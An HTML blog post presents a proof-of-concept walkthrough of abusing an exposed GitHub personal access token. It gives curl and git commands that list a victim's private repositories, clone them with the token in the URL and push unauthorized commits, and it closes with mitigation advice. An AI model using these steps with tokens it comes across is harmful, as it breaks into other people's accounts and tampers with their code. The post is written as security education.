<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Exploiting Github Token</title>
<meta name="description" content="How to hack Github Private Repo data with Access Token">

<style>
:root {
 --code-bg: ghostwhite;
}

@media (prefers-color-scheme: dark) {
  :root {
  --code-bg: #333;
  }
}

body {
  margin-block: 4rem;
  margin-inline: 3rem;
  line-height: 1.5;
}
header {
  h2 {
    margin-block-end: 0
  }

  p {
    margin-block-start: 0.5em;
    opacity: 0.6;
    font-size: 0.93rem;
    font-style: italic;
  }

  margin-block-end: 3.325rem;
}

@media (width < 40em) {
  body {
    margin-block: 1rem;
    margin-inline: 0rem;
  }
}

@media (prefers-color-scheme: dark) {
  body {
    background-color: #222;
    color: ghostwhite;
  }
}

pre {
  span {
    font-weight: bold;
  }

  span.muted {
    opacity: 0.7;
  }

  span.blue {
    color: rgb(0 50% 100%);
  }

  span.vs {
    color: black;
  }

  span.fs {
    color: blue;
  }
}

@media (prefers-color-scheme: dark) {
  pre span.fs {
    color: rgb(57, 228, 51);
  }

  pre span.vs {
    color: rgb(255, 154, 38)
  }
}

.dot {
  background-color: rgb(0 50% 100%);
  color: white;
  padding: 0.5ch;
}

canvas {
  display: block;
  margin-inline: 1rem;
  width: calc(min(36rem, 100%) - 2rem);
  aspect-ratio: 2/1;
}

header, p, blockquote, h3, iframe {
  max-width: 34rem;
  margin-inline: 1rem;
}

pre {
  max-width: 33rem;
  overflow-x: auto;
}

p, pre, canvas {
  margin-block: 2.4rem;
}

pre {
  padding: 1.5rem;
  background-color: var(--code-bg);
}

@media (width < 40em) {
  pre {
    padding-inline: 1rem;
  }
}

@media (width > 40em) {
  pre {
    border-radius: 8px;
  }
}

:not(pre) > code {
  padding: 1ch;
  background-color: var(--code-bg);
}

blockquote {
  opacity: 0.5;
  border-inline-start: 2px solid #888;
  margin-inline: 2px;
}

#bonus > pre {
  max-width: 100%;
  font-size: smaller;
  padding: 0 1rem 2ch 1rem;
  background: transparent;
}

iframe {
  margin-block-end: 3rem;
}

@media (width < 350px) {
  iframe {
    margin-inline: 0;
  }
}
</style>


  <meta name="og:image" content="/preview.png">
  <link rel="icon" href="/icon.png" type="image/png">
  <script type="module" crossorigin src="/assets/hello-gl.html-28qja5mA.js"></script>
  <link rel="modulepreload" crossorigin href="/assets/modulepreload-polyfill-B5Qt9EMX.js">
</head>

<body>

<header>
<h2>Exploiting Github Token</h2>
<p>
   srngx<br>
   Jan 30, 2025
</p>
</header>


<p>
Github's Personal Access token use for Authentication and leaving it somewhere in your configs or notes can leads to disaster depending on how much access you have given to this token.
</p>
<p>
Anyone with access to this token can gain unauthorize access to your github account and misuse it for their advantages.
</p>

<p>
For example: </p>
<ul>
 <li>Read or write to private repos</li>
 <li> Delete Repos</li>
 <li> Modifying Code </li>
 <li> Access Sensitive Data </li>
 <li> Escalating Privileges, changing repo setting, etc.</li>
 <li> Act on behalf of your identity</li>
</ul>
<p>
This is <em>A Proof of Concept</em> to demonstrate A Simple Attack against publicly exposed PAT TOKEN to access Private Repositories and Pushing Unauthorize code changes on behalf of Github Account Owner.
</p>
<h3>Exploiting Github's PAT to Enumerate Private Repositories</h3>

<p>This is my Personal Access Token</p>

<pre><code>ghp_R7DSrylV1usometoken4FK7lc
</code></pre>
<p>
<em>Dont try to attack it cuz its already been revoked. :p </em>
</p>
<p>
This is how yours will be look like too.
To learn about generating one of em click on [this link](https://www.geeksforgeeks.org/how-to-generate-personal-access-token-in-github)
</p>
<h3> Leverage GitHub's REST API </h3>
<p>
<b>Making an API Request to Enumerate Repositories</b>
</p>
<p>
GitHub's REST API allows you to interact with user data, including listing their private repositories.
</p>

<h3>Generate a Request with the Personal Access Token </h3>

<p>
The endpoint for listing repositories is:
<pre><code>GET /user/repos</code></pre>

</p>
<p>
However, you need to add an authorization header with the personal access token to authenticate. You can do this using curl, Python (requests), or other HTTP clients.
</p>
<p>
We will be using `curl` to enumerate repos.

<pre><code>curl -H "Authorization: token <\your_personal_access_token\>" "https://api.github.com/user/repos" </code></pre>

</p>
<p>
This will return JSON response with the list of both public and private repos.

but we want only private repos so we apend <code>?visibility=private</code> however its still giving us unwanted output but we want only list of repos so here comes <code>jq</code> for the rescue - a json processor.

So this is full command looks like
</p>
<pre><code>curl -H "Authorization: token ghp_R7DSrylV1uUoxxxxxxSUcfBXl2E4FK7lc" "https://api.github.com/user/repos?visibility=private" | jq -r '.[].html_url'
</code></pre>

<p>
Expected output:

<pre><code>https://github.com/elon/x-secret-project
https://github.com/elon/ai-countermeasures
https://github.com/elon/my-friends-on-mars</code></pre>
</p>
<p>
Now that we learned we have access to private repos lets try modifying and pushing code of any one repository.

But first we clone the repo using token because its private.
</p>
<h3>Git cloning the repo</h3> 

<pre><code># syntax
git clone https://username:<token>@github.com/username/repository.git

# command in my case
git clone https://srngx:ghp_R7DSrylV1uUoPT2HhSSxxxSUcfBXl2E4FK7lc@github.com/srngx/private_repo.git
</code></pre>


<h3>Pushing to Repo</h3> 
<pre><code>touch somefile
git add somefile
git commit -m "testing PAT"</code></pre>

<p>
Push using token

<pre><code>git push origin main</code></pre>

</p>
<p>
When asked for password use token instead of password.

also if you're passing the token in the clone URL (as shown earlier), it will automatically authenticate for pushing as well, and you wonâ€™t be prompted for username/password.
<pre><code>git push https://username:ghp_exampletoken1234@github.com/username/private-repo.git
</code></pre>

</p>

<h4>Note:</h4>
<hr>
<p>If you dont have github global config setup it will use the private repo owners name and email.
but if you want to leave your imprint (which malicious hacker wont normally do) and add yourself in contributors list in your victims github repo then you can setup global config.
</p>

<pre><code>git config --global user.name "your name"
git config --global user.email "you@email.com"</code></pre>

<p>
also you can use something like <b>Git Credential Helper</b> to store your credentials securely to avoid manually entering username and password everytime you use git push.
<pre><code>git config --global credential.helper cache
</code></pre>

</p>
</hr>

<h4>Mitigations</h4>
<hr>
<p>
<b>Mitigation Steps If a PAT Is Exposed</b>

If you've exposed your PAT publicly, take immediate action to protect your account:
</p>

	<p>
1. <b>Revoke the Exposed PAT</b>
- Goto your [Github Developer Settings](https://github.com/settings/tokens) And Delete or Revoke that token.
</p>
<p>
2. <b>Generate a New PAT</b>
- Create new token and this time try to not exposing it.
</p>
<p>
3. <b>Audit Your Account</b>:
- Review recent activity in your repositories for any suspicious actions (commits, issues, pull requests, etc.).
- Check if any unauthorized changes were made to your repositories or account settings.
</p>
<p>
4. <b>Use More Secure Storage for Tokens</b>:
- Environment variables: Store tokens in environment variables, not in the code.
- Password managers: Use a password manager to securely store and manage tokens.
- GitHub Secrets: For CI/CD pipelines, use GitHub Actions secrets or other secure vaults to store tokens.
</p>
<p>
5. <b>Set Appropriate Scopes for PATs</b>:
- Always limit the scope of your tokens to the least privilege required. For example, if you only need read access, do not grant write or admin access.
</p>
<p>
6. <b>Enable Two-Factor Authentication (2FA)</b>:
- Enable two-factor authentication on your GitHub account for an added layer of protection in case your credentials are compromised.
</p>

</body>
</html>
